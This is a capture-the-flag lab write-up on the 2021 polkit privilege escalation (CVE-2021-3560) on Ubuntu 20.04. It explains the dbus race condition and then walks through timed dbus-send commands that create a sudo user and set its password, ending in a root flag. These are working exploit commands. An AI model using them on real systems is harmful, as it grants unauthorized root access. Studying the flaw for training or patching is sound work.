## _**Overview**_  
---
In early 2021 a researcher namedÂ [Kevin Backhouse](https://github.blog/author/kevinbackhouse/)Â discovered a seven year old privilege escalation vulnerability (since designatedÂ CVE-2021-3560) in theÂ LinuxÂ polkit utility. Fortunately, different distributions ofÂ LinuxÂ (and even different versions of the same distributions) use different versions of the software, meaning that only some are vulnerable.

Specifically, the following mainstream distributions, amongst others, were vulnerable:

- Red Hat EnterpriseÂ LinuxÂ 8
- Fedora 21 (or later)
- Debian Testing ("Bullseye")
- Ubuntu 20.04 LTS ("Focal Fossa")  

All should now have released patched versions of their respective polkit packages, however, if you encounter one of these distributions then it may still be vulnerable if it hasn't been updated for a while.

For this room we will be focusing specifically on Ubuntu 20.04. Canonical released a patch for their version of polkit (`policykit-1`), which has version numberÂ `0.105-26ubuntu1.1`. The last vulnerable version available in the apt repositories for Focal Fossa isÂ `0.105-26ubuntu1`, so, if you see this, you may be in luck!

We can useÂ `apt list --installed | grep policykit-1`Â to check the installed version of polkit:  

![Image demonstrating the installed vulnerable version of polkit](https://assets.muirlandoracle.co.uk/thm/rooms/polkit/3e537ed069ff.png)

The original description of this vulnerability can be found in a post written by Kevin Backhouse,Â [here](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/).  

---

### _**What is Polkit?**_  
----
The logical question to be asking right now is: "What is polkit?"

Polkit is part of the Linux authorization system. In effect, when you try to perform an action which requires a higher level of privileges, the policy toolkit can be used to determine whether you have the requisite permissions. It is integrated with systemd and is much more configurable than the traditional sudo system. Indeed, it is sometimes referred to as the "sudo of systemd".

When interacting with polkit we can useÂ `pkexec`, instead ofÂ `sudo`. As an example, attempting to run theÂ `useradd`Â command throughÂ `pkexec`Â in aÂ GUIÂ session results in a pop-up asking for credentials:  
`pkexec useradd test1234`  
![Demonstrating the polkit GUI authentication dialogue](https://assets.muirlandoracle.co.uk/thm/rooms/polkit/3ceb61a94882.png)  

In aÂ CLIÂ session, we get a text-based prompt instead:  
![Demonstrating the polkit CLI authentication dialogue](https://assets.muirlandoracle.co.uk/thm/rooms/polkit/b42accbd7f01.png)  

To summarize, the policy toolkit can be thought of as a fine-grained alternative to the simpler sudo system.

---

### _**How is Polkit vulnerable?**_  
---
The next logical question is of course: "How can we exploit polkit"?

The short answer is: by manually sending dbus messages to the dbus-daemon (effectively an API to allow different processes the ability to communicate with each other), then killing the request before it has been fully processed, we can trick polkit into authorizing the command. If you are not familiar with daemons, they are effectively background services running onÂ Linux. The dbus-daemon is a program running in the background which brokers messages between applications.  

For the sake of keeping this room relatively light, we won't go too deep into the specifics behind this (although reading theÂ [full article on the vulnerability](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#about)Â is highly recommended). Effectively, the vulnerability can be boiled down to these steps:

```ad-summary
1. The attacker manually sends a dbus message to the accounts-daemon requesting the creation of a new account with sudo permissions (or latterly, a password to be set for the new user). This message gets given a unique ID by the dbus-daemon.  
2. The attacker kills the message after polkit receives it, but before polkit has a chance to process the message. This effectively destroys the unique message ID.
3. Polkit asks the dbus-daemon for the user ID of the user who sent the message, referencing the (now deleted) message ID.
4. The dbus-daemon can't find the message ID because we killed it in step two. It handles the error by responding with an error code.
5. Polkit mishandles the error and substitutes in 0 for the user ID -- i.e. the root account of the machine.  
6. Thinking that the root user requested the action, polkit allows the request to go through unchallenged.
```

In short, by destroying the message ID before the `dbus-daemon` has a chance to give polkit the correct ID, we exploit the poor error-handling in polkit to trick the utility into thinking that the request was made by the all-powerful root user.  

If this doesn't make sense now, hopefully it will after you've had a chance to perform the exploit yourself!


## Exploitation Process
----

We've seen the theory, now let's see it in action!

Let's try to add a new user calledÂ `attacker`, with sudo permissions, and a password ofÂ `Expl01ted`. Just read this information for now -- you will have time to try it in the next task!  

First, let's look at the dbus messages we'll need to send:

- `dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1`

This command will manually send a dbus message to the accounts daemon, printing the response and creating a new user called attacker (`string:attacker`) with a description of "Pentester Account" (`string:"Pentester Account"`) and membership of the sudo group set to true (referenced by the`int32:1`Â flag).

Our second dbus message will set a password for the new account:

- `dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/UserUSER_IDÂ org.freedesktop.Accounts.User.SetPassword string:'PASSWORD_HASH' string:'Ask the pentester'`  



This once again sends a dbus message to the accounts daemon, requesting a password change for the user with an ID which we specify (shown in red), a password hash which we need to generate manually, and a hint ("Ask the pentester")

---

As this is effectively a race condition, we first need to determine how long our command will take to run. Let's try this with the first dbus message:  

`time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1`  

![](https://assets.muirlandoracle.co.uk/thm/rooms/polkit/fe8af4395935.png)  

This takes 0.011 seconds, or 11 milliseconds. This number will be slightly different each time you run the command; however, on the provided machine it should always beÂ _around_Â this number.

_**Note:**Â For the first five minutes or so of deployment the machine is still booting things in the background, so don't be alarmed if the time you get is a lot longer to begin with -- just keep running the command periodically until it gives you a time in a similar region to the results above._

We need to kill the command approximately halfway through execution. Five milliseconds usually works fairly well on the provided machine; however, be aware that this is not an exact thing. You may need to change the sleep time, or run the command several times before it works. That said, once you find a time that works, it should work consistently. If you are struggling to get a working time, putting the command inside a bash for loop and quickly running through a range of times tends to work fairly well.  

Let's try this. We need to send the dbus message, then kill it about halfway through:  

`dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!`

![](https://assets.muirlandoracle.co.uk/thm/rooms/polkit/b1dba51148aa.png)  

To explain the above command, we sent the dbus message in a background job (using the ampersand to background the command). We then told it to sleep for 5 milliseconds (`sleep 0.005s`), then kill the previous process (`$!`). This successfully created the new user, adding them into the sudo group.  
We should note down at this point that the user ID of the new user in this instance is 1000.

Now all we need to do is give the user a password and we should be good to go!

---

We need a password hash here, so let's generate a Sha512Crypt hash for our chosen password (`Expl01ted`):  

`openssl passwd -6 Expl01ted`  

![](https://assets.muirlandoracle.co.uk/thm/rooms/polkit/1316626c8114.png)  

Using openssl, we generate a password of type 6 (SHA512-crypt) and our plaintext password (`Expl01ted`).

Now let's finish this! 5 milliseconds worked last time, so it should work here too:  

`dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000Â org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!`

![](https://assets.muirlandoracle.co.uk/thm/rooms/polkit/12e11c378d8d.png)

With a hop, su, and aÂ `sudo -s`, we have root!


![Pasted image 20250107154644.png](../../IMAGES/Pasted%20image%2020250107154644.png)

We have root flag, we must submit it to the flag system and we will get our normal flag:

![Pasted image 20250107154738.png](../../IMAGES/Pasted%20image%2020250107154738.png)

So, our flag would be: `THM{N2I0MTgzZTE4ZWQ0OGY0NjdiNTQ0NTZi}`
